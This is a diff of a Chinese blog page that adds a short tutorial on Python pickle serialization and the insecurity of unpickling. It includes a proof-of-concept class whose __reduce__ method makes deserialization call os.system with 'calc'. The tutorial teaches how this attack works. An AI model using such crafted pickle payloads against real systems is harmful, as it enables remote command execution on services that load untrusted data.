@@ -71,7 +71,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle%E5%9F%BA%E7%A1%80"><span class="toc-text">Pickle基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">能够序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%8F%8A%E6%8E%A5%E5%8F%A3"><span class="toc-text">常见方法及接口</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pker%E5%B7%A5%E5%85%B7"><span class="toc-text">Pker工具</span></a></li></ol>
     </div>
   
         
@@ -212,6 +212,32 @@
             2023/9/2
         </span>
         
+        <span class="category">
+            <a href="/blog/categories/web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00a596">反序列化</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/python/" style="color: #03a9f4">python</a>
+            </span>
+            
+        </span>
         
         <!--文章字数统计-->
         
@@ -222,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">0字</span>
+        <span class="post-count">810字</span>
       </span>
     </span>
 
@@ -231,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">3分</span>
       </span>
     </span>
     
@@ -246,7 +272,86 @@
     </div>
     
     <div class="content" v-pre>
-        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">参考枫的博客</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="Pickle基础"><a href="#Pickle基础" class="headerlink" title="Pickle基础"></a>Pickle基础</h1><p>pickle是Python中一个能够序列化和反序列化对象的模块</p>
+<p>和java反序列化相似</p>
+<p>在Python中，<code>Pickling</code> 是将 Python 对象及其所拥有的层次结构转化为一个<strong>二进制字节流</strong>的过程，也就是我们常说的序列化，而 <code>unpickling</code> 是相反的操作，会将字节流转化回一个对象层次结构</p>
+<p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
+<p>demo：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">19</span>
+        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"C1oudfL0w0"</span>
+
+p <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token punctuation">)</span>
+opcode <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
+P <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The age is:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'The name is:'</span> <span class="token operator">+</span> P<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行得到</p>
+<p><img src="/blog/2023/09/02/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230915221256156.png" alt="image-20230915221256156"></p>
+<p>很明显，我们通过<code>pickle.dumps()</code>函数将一个Person对象序列化成二进制字节流的形式</p>
+<p>然后使用<code>pickle.loads()</code>将一串二进制字节流反序列化为一个Person对象</p>
+<h2 id="能够序列化的对象"><a href="#能够序列化的对象" class="headerlink" title="能够序列化的对象"></a>能够序列化的对象</h2><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickle.html#what-can-be-pickled-and-unpickled">官方文档</a></p>
+<ul>
+<li><code>None</code>、<code>True</code> 和 <code>False</code></li>
+<li>整数、浮点数、复数</li>
+<li><code>str</code>、<code>byte</code>、<code>bytearray</code></li>
+<li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li>
+<li>定义在模块顶层的函数（使用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def"><code>def</code></a> 定义，<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda"><code>lambda</code></a> 函数则不可以）</li>
+<li>定义在模块顶层的内置函数</li>
+<li>定义在模块顶层的类</li>
+<li>某些类实例，这些类的 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__"><code>__dict__</code></a> 属性值或 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__"><code>__getstate__()</code></a> 函数的返回值可以被打包（详情参阅 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst">打包类实例</a> 这一段）</li>
+</ul>
+<hr>
+<h2 id="常见方法及接口"><a href="#常见方法及接口" class="headerlink" title="常见方法及接口"></a>常见方法及接口</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>将打包好的对象 <em>obj</em> 写入文件中</p>
+<p>将 <em>obj</em> 打包以后的对象作为<code>bytes</code>类型直接返回</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>从 文件&#x2F;data 中读取二进制字节流，将其反序列化为一个对象并返回</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">object</span><span class="token punctuation">.</span>__reduce__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>__reduce__()</code>其实是object类中的一个魔术方法，我们可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行</p>
+<p>Python要求这个方法返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该<code>callable</code>就会<strong>被调用</strong>，参数为<code>para1、para2...</code></p>
+<hr>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>和java反序列化一样，pickle的不安全因素在于反序列化未知的二进制字节流，也就是说通过构造字节流就能实现命令执行</p>
+<p>demo：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> os
+ 
+<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">19</span>
+        self<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"C1oudfL0w0"</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        command<span class="token operator">=</span><span class="token string">r"calc"</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+p<span class="token operator">=</span>Person<span class="token punctuation">(</span><span class="token punctuation">)</span>
+opcode<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
+ 
+P<span class="token operator">=</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The age is:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'The name is:'</span><span class="token operator">+</span>P<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我在Person类中加入了<code>__reduce__</code>函数，该函数能够定义该类的二进制字节流被反序列化时进行的操作。</p>
+<p>返回值是一个<code>(callable, ([para1,para2...])[,...])</code>类型的元组。</p>
+<p>当字节流被反序列化时，Python就会执行<code>callable(para1,para2...)</code>函数。</p>
+<p>因此当上述的Person对象被<code>unpickling</code>时，就会执行<code>os.system(command)</code></p>
+<p><img src="/blog/2023/09/02/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230915222708782.png" alt="image-20230915222708782"></p>
+<hr>
+<h1 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">github仓库</a></p>
+
     </div>
     
     
